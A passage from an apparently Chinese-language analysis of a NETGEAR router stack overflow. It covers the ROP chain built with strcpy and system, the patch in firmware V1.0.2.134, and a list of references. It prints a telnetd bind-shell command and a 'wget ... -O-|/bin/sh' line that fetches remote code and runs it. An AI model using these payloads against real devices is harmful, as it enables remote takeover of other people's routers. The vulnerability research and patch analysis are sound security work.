    s.close()
在漏洞点下断点，
两次拷贝完成后，看下内存布局：
可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给
ROP 的 payload 一片容身之地。
借用原作者的一张图，利用原理如下：
关于 ROP，使用 `strcpy` 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 `system` 执行即可。
原作者构造的 `system("telnetd -l /bin/sh -p 9999& ")` 绑定型 shell。
经过分析，我发现可以构造 `system("wget http://{reverse_ip}:{reverse_port} -O-|/bin/sh")`
调用，从而无限制任意命令执行。
构造的关键在于下面这张表。
发送 payload，通过 hook 的日志可以看到，ROP 利用链按照预期工作，可以无限制远程命令执行。 （由于模拟环境的问题，wget
命令运行段错误了...）
# 5.补丁分析
在更新版固件 `V1.0.2.134` 中，用 `strncpy()` 代替 `strcpy()`，限制了拷贝长度为 `0x5db`，正好是 buffer
长度减 1。
补丁中还特意用 `memset()` 初始化了 buffer。这是由于 `strncpy()` 在拷贝时，如果 n 
【2】: 漏洞详情
【3】: NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞
【4】: Unlocking the Netgear Telnet Console
【5】: 固件下载
【6】: firmadyne
【7】: ARM-X
【8】: Vivotek 摄像头远程栈溢出漏洞分析及利用
【9】: nvram hook 库
【10】: ZoomEye 搜索
* * *